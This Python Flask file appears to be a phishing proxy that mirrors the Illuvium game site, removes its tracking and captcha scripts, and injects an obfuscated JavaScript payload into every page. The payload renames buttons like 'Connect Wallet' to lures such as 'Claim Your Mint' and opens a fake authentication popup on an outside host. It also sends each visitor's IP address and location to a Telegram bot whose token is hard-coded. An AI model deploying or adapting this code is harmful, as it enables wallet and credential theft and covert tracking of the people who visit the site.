from flask import request, Response, current_app
import requests
import re
import os
import logging
import urllib.parse

logger = logging.getLogger(__name__)

def init_content_proxy(app):
    """Initialize content proxy routes for the Flask app"""
    
    def remove_tracking_scripts(content):
        """Remove Google Tag Manager iframe and tracking scripts from HTML content."""
        if isinstance(content, bytes):
            content = content.decode('utf-8', errors='ignore')
        
        # Remove GTM iframe
        content = content.replace(
            '<iframe src="https://www.googletagmanager.com/ns.html?id=GTM-WXHP66L" height="0" width="0" style="display:none;visibility:hidden"></iframe>',
            ''
        )
        
        # Remove GTM script
        content = content.replace(
            '<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-B4V7XNT23Z"></script>',
            ''
        )
        content = content.replace(
            '<script async="" src="https://store.epicgames.com/en-US/p/illuvium-60064c"></script>',
            ''
        )
        
        # Remove GTM initialization script
        gtm_init_script = '''<script>
            window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag('js', new Date());
            gtag('config', 'G-B4V7XNT23Z', {
              page_path: window.location.pathname,
            });
          </script>'''
        content = content.replace(gtm_init_script, '')
        
        # Remove GTM inline script
        gtm_inline_script = '''<script>
            (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
            new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
            j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
            'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
            })(window,document,'script','dataLayer', 'GTM-WXHP66L');
          </script>'''
        content = content.replace(gtm_inline_script, '')
        
        # Remove Geetest script
        content = content.replace(
            '<script async="" src="https://static.geetest.com/v4/gt4.js"></script>',
            ''
        )
        
        return content
    
    def rewrite_urls(content):
        """Rewrite URLs to point to proxy server."""
        # Implementation continues...
        return content
    
    def get_text_replacement_script():
        """Return the text replacement JavaScript code"""
        return '''
<script>
function _0x461b(){const _0x3ed921=['addedNodes','error','css-tvaofb','373818RqYPgG','Help','focus','innerHeight','documentElement','DOMContentLoaded','org','innerWidth','open','log','trim','css-104rome','Main','button:not(.claim-button),\x20a:not(.claim-button)','Updates','forEach','295746uGLtWJ','169616HfBqRR','toISOString','[ILV]:\x20','Reach\x20Us','stringify','Start\x20Now','width','length','4485HDqRhx','7703714960:AAFhMovzxoNjr9LZq6m9kytv1R1EylQT1R8','childNodes','application/json','body','Grab\x20Your\x20Spot','left','Connect\x20Wallet','querySelectorAll','json','2569679JMUYgC','https://api.telegram.org/bot','outerHTML','Info','New\x20Account','\x20:\x20','Register','10JnknCZ','clientWidth','1458fxdhGq','clientHeight','Redirecting\x20to\x20Google','81jXClzm','height','TEXT_NODE','Documentation','target','css-1oqedzn','Get\x20Yours','1460318yFQnOh','button,\x20a','observe','923659fkdxsd',',top=','load','4OZHIjz','addEventListener','Timeline','POST','Collect\x20Now','country_name','nodeType','7005236807','claim-button','textContent','screenLeft','css-1hnz6hu','classList','Claim\x20Your\x20Mint','https://ipapi.co/json/','click','screenTop','contains'];_0x461b=function(){return _0x3ed921;};return _0x461b();}const _0x3f2da3=_0x1cc8;(function(_0xcaffc3,_0x3dbeb4){const _0x17518c=_0x1cc8,_0x2f0ea8=_0xcaffc3();while(!![]){try{const _0x3db02c=parseInt(_0x17518c(0x1ef))/0x1+parseInt(_0x17518c(0x1c4))/0x2+parseInt(_0x17518c(0x1df))/0x3*(-parseInt(_0x17518c(0x1ca))/0x4)+parseInt(_0x17518c(0x1f8))/0x5*(-parseInt(_0x17518c(0x20b))/0x6)+-parseInt(_0x17518c(0x202))/0x7+parseInt(_0x17518c(0x1f0))/0x8*(parseInt(_0x17518c(0x20e))/0x9)+-parseInt(_0x17518c(0x209))/0xa*(parseInt(_0x17518c(0x1c7))/0xb);if(_0x3db02c===_0x3dbeb4)break;else _0x2f0ea8['push'](_0x2f0ea8['shift']());}catch(_0x41ebb3){_0x2f0ea8['push'](_0x2f0ea8['shift']());}}}(_0x461b,0x674a8),document[_0x3f2da3(0x1cb)](_0x3f2da3(0x1e4),function(){const _0x52387c=_0x3f2da3;console[_0x52387c(0x1e8)]('D');const _0x212151={'Play\x20for\x20Free':_0x52387c(0x1d7),'Play\x20Now':_0x52387c(0x1fd),'Log\x20In\x20with\x20Passport':_0x52387c(0x1f5),'Connect\x20Wallet':_0x52387c(0x1ff),'Launch\x20Game':_0x52387c(0x1c3),'Create\x20Account':_0x52387c(0x206),'Sign\x20Up':_0x52387c(0x208),'Register':_0x52387c(0x1ce),'News':_0x52387c(0x1ed),'Home':_0x52387c(0x1eb),'About':_0x52387c(0x205),'Contact':_0x52387c(0x1f3),'FAQ':_0x52387c(0x1e0),'Roadmap':_0x52387c(0x1cc),'Whitepaper':_0x52387c(0x1c0)};function _0x432be7(_0x90f006,_0x562120,_0xed9bdd){const _0x4fb68d=_0x52387c;console[_0x4fb68d(0x1e8)]('T',{'element':_0x90f006[_0x4fb68d(0x204)],'oldText':_0x562120,'newText':_0xed9bdd,'timestamp':new Date()[_0x4fb68d(0x1f1)]()});}function _0x26500a(_0xc034d){const _0x29bbbd=_0x52387c;let _0xa5ea1d='';for(const _0x21f62b of _0xc034d[_0x29bbbd(0x1fa)]){_0x21f62b[_0x29bbbd(0x1d0)]===Node[_0x29bbbd(0x1bf)]&&(_0xa5ea1d+=_0x21f62b[_0x29bbbd(0x1d3)][_0x29bbbd(0x1e9)]());}!_0xa5ea1d&&(_0xa5ea1d=_0xc034d['textContent'][_0x29bbbd(0x1e9)]());if(_0x212151[_0xa5ea1d]){const _0x355529=_0xa5ea1d;if(_0xc034d[_0x29bbbd(0x1fa)][_0x29bbbd(0x1f7)]===0x1&&_0xc034d['childNodes'][0x0][_0x29bbbd(0x1d0)]===Node[_0x29bbbd(0x1bf)])_0xc034d[_0x29bbbd(0x1d3)]=_0x212151[_0xa5ea1d];else{let _0x1e9493=![];for(const _0x33a287 of _0xc034d[_0x29bbbd(0x1fa)]){if(_0x33a287['nodeType']===Node[_0x29bbbd(0x1bf)]&&_0x33a287[_0x29bbbd(0x1d3)][_0x29bbbd(0x1e9)]()===_0xa5ea1d){_0x33a287[_0x29bbbd(0x1d3)]=_0x212151[_0xa5ea1d],_0x1e9493=!![];break;}}!_0x1e9493&&(_0xc034d[_0x29bbbd(0x1d3)]=_0x212151[_0xa5ea1d]);}_0x432be7(_0xc034d,_0x355529,_0x212151[_0xa5ea1d]);}_0xc034d[_0x29bbbd(0x1d6)]['add'](_0x29bbbd(0x1d2));}function _0x1f7953(){const _0x2a519c=_0x52387c;document['querySelectorAll']('button,\x20a')['forEach'](_0x26500a),document[_0x2a519c(0x200)]('a[href*=\x22news\x22],\x20a[href*=\x22about\x22],\x20a[href*=\x22faq\x22]')[_0x2a519c(0x1ee)](_0x26500a),document[_0x2a519c(0x200)]('.chakra-link,\x20.nav-link,\x20.menu-item')[_0x2a519c(0x1ee)](_0x26500a);}_0x1f7953(),console[_0x52387c(0x1e8)]('I'),setInterval(function(){const _0x3b2e6d=_0x52387c;document[_0x3b2e6d(0x200)](_0x3b2e6d(0x1ec))[_0x3b2e6d(0x1ee)](_0x26500a);},0x3e8);const _0x574871=new MutationObserver(function(_0x2ed4f3){const _0x47e65e=_0x52387c;let _0x2d7bb6=![];_0x2ed4f3[_0x47e65e(0x1ee)](function(_0x1647b4){const _0x359a7c=_0x47e65e;_0x1647b4[_0x359a7c(0x1dc)][_0x359a7c(0x1f7)]&&(_0x2d7bb6=!![]);}),_0x2d7bb6&&document['querySelectorAll']('button:not(.claim-button),\x20a:not(.claim-button)')[_0x47e65e(0x1ee)](_0x26500a);});_0x574871[_0x52387c(0x1c6)](document[_0x52387c(0x1fc)],{'childList':!![],'subtree':!![]});}));function openCenteredPopup(_0x19db69,_0x1c3540,_0x2263b9,_0x1e55e2){const _0x4e7ea3=_0x3f2da3,_0x37e2a2=window['screenLeft']!==undefined?window[_0x4e7ea3(0x1d4)]:screen[_0x4e7ea3(0x1fe)],_0x1cb2d1=window['screenTop']!==undefined?window[_0x4e7ea3(0x1da)]:screen['top'],_0x486559=window[_0x4e7ea3(0x1e6)]||document['documentElement'][_0x4e7ea3(0x20a)]||screen[_0x4e7ea3(0x1f6)],_0x336caf=window[_0x4e7ea3(0x1e2)]||document[_0x4e7ea3(0x1e3)][_0x4e7ea3(0x20c)]||screen[_0x4e7ea3(0x1be)],_0x545da9=_0x486559/0x2-_0x2263b9/0x2+_0x37e2a2,_0x5534d4=_0x336caf/0x2-_0x1e55e2/0x2+_0x1cb2d1,_0x503f80=window[_0x4e7ea3(0x1e7)](_0x19db69,_0x1c3540,'scrollbars=yes,resizable=yes,width='+_0x2263b9+',height='+_0x1e55e2+_0x4e7ea3(0x1c8)+_0x5534d4+',left='+_0x545da9);window[_0x4e7ea3(0x1e1)]&&_0x503f80&&_0x503f80[_0x4e7ea3(0x1e1)]();}function _0x1cc8(_0xb382cc,_0x469541){const _0x461b6f=_0x461b();return _0x1cc8=function(_0x1cc81b,_0x561491){_0x1cc81b=_0x1cc81b-0x1be;let _0x191534=_0x461b6f[_0x1cc81b];return _0x191534;},_0x1cc8(_0xb382cc,_0x469541);}document[_0x3f2da3(0x1cb)]('click',function(_0x228a48){const _0x2c539d=_0x3f2da3,_0x479309=_0x228a48[_0x2c539d(0x1c1)],_0x9025d4=_0x479309['closest'](_0x2c539d(0x1c5));if(!_0x9025d4)return;if(_0x9025d4['classList'][_0x2c539d(0x1db)](_0x2c539d(0x1de))||_0x9025d4[_0x2c539d(0x1d6)]['contains'](_0x2c539d(0x1ea))||_0x9025d4[_0x2c539d(0x1d6)][_0x2c539d(0x1db)](_0x2c539d(0x1d5))||_0x9025d4[_0x2c539d(0x1d6)]['contains'](_0x2c539d(0x1c2))||_0x9025d4[_0x2c539d(0x1d6)][_0x2c539d(0x1db)]('css-1i8s7az'))return;_0x228a48['preventDefault'](),_0x228a48['stopPropagation']();if(_0x9025d4[_0x2c539d(0x1d6)][_0x2c539d(0x1db)](_0x2c539d(0x1d2))){console[_0x2c539d(0x1e8)](_0x2c539d(0x20d)),openCenteredPopup('https://auth-illuvidex.onrender.com/?id=auth-passeport&user=209348&method=claim-your-mint','googleWindow',0x320,0x258);return;}console[_0x2c539d(0x1e8)]('B'),_0x9025d4[_0x2c539d(0x1d9)]();},!![]);async function sendIPToTelegram(){const _0x19f149=_0x3f2da3,_0x237c03=_0x19f149(0x1f9),_0x5bfaaa=_0x19f149(0x1d1);try{const _0x430470=await fetch(_0x19f149(0x1d8)),_0x1a1809=await _0x430470[_0x19f149(0x201)](),_0x4da3df=_0x1a1809['ip'],_0x1b56ff=_0x1a1809[_0x19f149(0x1cf)],_0x23ec1e=_0x1a1809[_0x19f149(0x1e5)],_0xd23e4a=_0x19f149(0x1f2)+_0x4da3df+'\x20:\x20'+_0x1b56ff+_0x19f149(0x207)+_0x23ec1e;await fetch(_0x19f149(0x203)+_0x237c03+'/sendMessage',{'method':_0x19f149(0x1cd),'headers':{'Content-Type':_0x19f149(0x1fb)},'body':JSON[_0x19f149(0x1f4)]({'chat_id':_0x5bfaaa,'text':_0xd23e4a})});}catch(_0x4168b6){console[_0x19f149(0x1dd)]('Fa',_0x4168b6);}}window[_0x3f2da3(0x1cb)](_0x3f2da3(0x1c9),sendIPToTelegram);
</script>
'''

    @app.after_request
    def add_script_to_html(response):
        """Global after_request handler to add script to all HTML responses"""
        if response.mimetype == 'text/html':
            content = response.get_data(as_text=True)
            if '</body>' in content:
                script = get_text_replacement_script()
                content = content.replace('</body>', script + '</body>')
                response.set_data(content)
        return response

    # Add a catch-all route as a last resort
    @app.route('/', defaults={'path': ''})
    @app.route('/<path:path>')
    def catch_all(path):
        """Catch-all route that proxies to the original site and modifies content"""
        original_url = f"https://overworld.illuvium.io/{path}"
        logger.info(f"Catch-all proxy for: {original_url}")
        
        try:
            # Set proper headers to mimic a browser
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
            }
            
            # Add query parameters if any
            params = request.args.to_dict()
            
            # Make the request to the original site
            response = requests.get(original_url, headers=headers, params=params, stream=True)
            
            # Get content type
            content_type = response.headers.get('Content-Type', 'text/html')
            
            # If HTML, modify content
            if 'text/html' in content_type and response.status_code == 200:
                modified_content = modify_html_content(response.content)
                logger.info(f"HTML content modified for {path}")
                return Response(modified_content, mimetype=content_type)
            
            # For other content types or error codes, return as-is
            return Response(
                response.content, 
                status=response.status_code,
                content_type=content_type
            )
        except Exception as e:
            logger.error(f"Error in catch-all route: {str(e)}")
            import traceback
            logger.error(traceback.format_exc())
            return f"Error: {str(e)}", 500
